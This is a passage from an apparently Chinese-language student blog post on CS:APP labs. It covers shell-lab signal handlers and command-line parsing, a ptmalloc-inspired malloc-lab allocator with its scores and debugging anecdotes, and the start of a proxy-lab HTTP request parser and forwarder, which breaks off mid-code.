</span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid){</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (sigint) error"</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigint_handler: Job (%d) killed\n"</span>, pid);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: exiting"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid,SIGTSTP)&lt;<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (tstp) error"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigstp_handler: Job [%d] (%d) stopped\n"</span>, job-&gt;jid, pid);</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: exiting"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="parseline"><a href="#parseline" class="headerlink" title="parseline"></a>parseline</h3><p>lab直接给出的,学一下实现.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> array[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="type">char</span> *buf = array;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="type">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="type">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="type">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">' '</span>;  <span class="comment">/* replace trailing '\n' with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">buf++;</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) {</span><br><span class="line">argv[argc++] = buf;</span><br><span class="line">*delim = <span class="string">'\0'</span>;</span><br><span class="line">buf = delim + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">       buf++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">    buf++;</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">}</span><br><span class="line">    }</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">'&amp;'</span>)) != <span class="number">0</span>) {</span><br><span class="line">argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab7-Malloc-lab"><a href="#Lab7-Malloc-lab" class="headerlink" title="Lab7:Malloc lab"></a>Lab7:Malloc lab</h1><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>参照ptmalloc.</p><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221858686.png"></p><h3 id="空闲块组织"><a href="#空闲块组织" class="headerlink" title="空闲块组织"></a>空闲块组织</h3><p>分为fastbins和bins,fastbins不参与合并不进行切割.两者均采用单向链表的组织结构,fastbins有7个,由于堆块对齐的原因各个fastbins中chunk大小相同,故不需排序,从头部取出或放入.bins有8个,需排序.</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>第一次跑过所有测试,80分,但此时还没有加入空闲块合并的功能.<br>查看util极低的数据,观察发现确实是空闲块未合并导致的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306211450673.png"></p><p>加入空闲块合并之后,好的,降了10分<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221745035.png"><br>发现原因是因为我的设计大部分参考的是glibc中ptmalloc的实现,注重查找的效率,但由于我本地的机器较快导致性能一直是满分,所以评分仅取决于空间利用率.</p><p>所以一些设计比如增加bin的数量(将空闲块按大小分区间组织加快查找速度),设计fastbin不参与合并加快速度,分配较大的top chunk减少mem_sbrk的调用次数(其实没有必要,ptmalloc这样实现是为了减少sbrk或mmap系统调用的开销,而本实验中的mm_malloc是建立在一个模拟的mem_sbrk之上,并不会进行系统调用)等,反而降低了空间利用率.</p><p>这是将fastbins和bins数量均减为1,topchunk默认大小改为0x1000后的成绩.可见空间利用率大幅提升.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221847904.png"></p><p>还有很多可以完善的地方,不过现阶段对算法和数据结构的理解还不够,没办法自己设计,照着ptmalloc2写一份也没有太多意义.等之后看有没有机会实现一个完整的,直接使用系统调用的.</p><h3 id="一些debug插曲"><a href="#一些debug插曲" class="headerlink" title="一些debug插曲"></a>一些debug插曲</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>(高达5220%的内存利用率的超级内存分配器<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202159747.png"></p><p>一部分trace测试因分配到了brk更高地址被终止.<br>另一部分则发生段错误造成crash,测试这部分样例.<br>直接run起来,观察崩溃点,发现程序在访问(eax+4)内存时发生段错误,该表达式对应为top-&gt;size.即eax表示top的值为0.<br>top指针在初始化之后肯定是不可能为0的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202147605.png"><br>设置观察点:watch (top==0),重新运行程序.<br>发现程序在此处停住,但源码中并没有top作为左值的语句.<br>瞬间反应过来,bins下标越界.<br>改掉程序中对i的检查.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202152686.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>然而我调试了接近两个小时后,发现最关键的问题在mdriver程序会多次调用mm_init函数,且在调用前将mem_brk复位,而我的init函数只是为调用一次使用的,并没有清空bins和top,导致多次运行时使用大量mem_brk之外的内存……<br>这才是上面内存利用率超高的原因.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210005305.png"></p><p>不过两小时也没白费,学了好多诸如watchpoints的调试命令和找到一些调试技巧.</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>重写init函数,再次运行,不出意外的异常退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210007226.png"><br>不过只在部分样例中异常退出,原因是ran out of memory.这倒是很正常,因为此时还没有编写空闲块合并和realloc的功能<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210008744.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>编写realloc功能后运行崩溃,调试发现是realloc时没有做边界检查,如果下一个chunk是topchunk将会在切割后unlink(topchunk),而topchunk自然是不会在bin中的故引发”mm_unlink: nonexistent mptr”</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>在mm_realloc和mm_malloc里调用mm_free时,应该使用用户态的指针而不是堆块头部指针…..感觉这是个挺容易犯错的地方</p><h1 id="Lab8-Proxy-lab"><a href="#Lab8-Proxy-lab" class="headerlink" title="Lab8:Proxy lab"></a>Lab8:Proxy lab</h1><h2 id="Part-A-2"><a href="#Part-A-2" class="headerlink" title="Part A"></a>Part A</h2><h3 id="设计-1"><a href="#设计-1" class="headerlink" title="设计"></a>设计</h3><p>使用的结构为</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br></pre></td></tr></tbody></table></figure><p>这是整个PartA的处理流程,其中Forward2Client未做处理,直接将从服务器收到的数据原封不动转发给客户端.Part A完成后程序已经可以在浏览器中实现代理访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240020148.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240023578.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORTLEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_HEADERS 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_PRINT <span class="string">"HanQi_Proxy &gt; "</span></span></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"proxy.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">parse_uri</span><span class="params">(<span class="type">char</span> uri[],RequestLine* requestline)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* address_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* port_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* path_ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(address_ptr = <span class="built_in">strstr</span>(uri,<span class="string">"//"</span>))</span><br><span class="line">        address_ptr += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        address_ptr = uri;</span><br><span class="line">    <span class="keyword">if</span>(port_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">":"</span>))</span><br><span class="line">        port_ptr += <span class="number">1</span>;</span><br><span class="line">    path_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(path_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,path_ptr,MAXLINE);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,<span class="string">"/"</span>,<span class="number">2</span>);</span><br><span class="line">        path_ptr = address_ptr+<span class="built_in">strlen</span>(address_ptr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(port_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,port_ptr,path_ptr-port_ptr);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,<span class="string">"80"</span>,<span class="number">3</span>);</span><br><span class="line">        port_ptr = path_ptr;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestline-&gt;host,address_ptr,port_ptr-address_ptr<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"RequestTarget: %s:%s%s\n"</span>,requestline-&gt;host,requestline-&gt;port,requestline-&gt;path);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">read_requesthdrs</span><span class="params">(<span class="type">rio_t</span>* rio,RequestHeader requestheaders[MAX_HEADERS])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sscanf</span>(buf,<span class="string">"%[^:]: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">if</span>(i==MAX_HEADERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_headers</span><span class="params">(RequestHeader requestheaders[MAX_HEADERS],<span class="type">int</span>* headers_num,<span class="type">char</span>* headername,<span class="type">char</span>* headervalue)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;MAX_HEADERS;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(headername,requestheaders[i].name))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">strncpy</span>(requestheaders[i].value,headervalue,MAXLINE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].name,headername,MAXLINE);</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].value,headervalue,MAXLINE);</span><br><span class="line">    ++(*headers_num);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Write2Server</span><span class="params">(<span class="type">int</span> server_fd,RequestLine* requestline,RequestHeader requestheaders[],<span class="type">int</span> headers_num)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to %s:%s,ing...\n"</span>,requestline-&gt;host,requestline-&gt;port);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">3</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里不是很懂,最后转发给服务器的uri只留下文件路径?</span></span><br><span class="line">    <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s %s %s\r\n"</span>,requestline-&gt;method,requestline-&gt;path,requestline-&gt;version);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;headers_num;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Forward2Client</span><span class="params">(<span class="type">int</span> client_fd,<span class="type">int</span> server_fd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line">    <span class="type">rio_t</span> server_rio;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to Client,ing...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;server_rio,server_fd);</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="comment">// headers_num = read_requesthdrs(&amp;server_rio,headers);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span 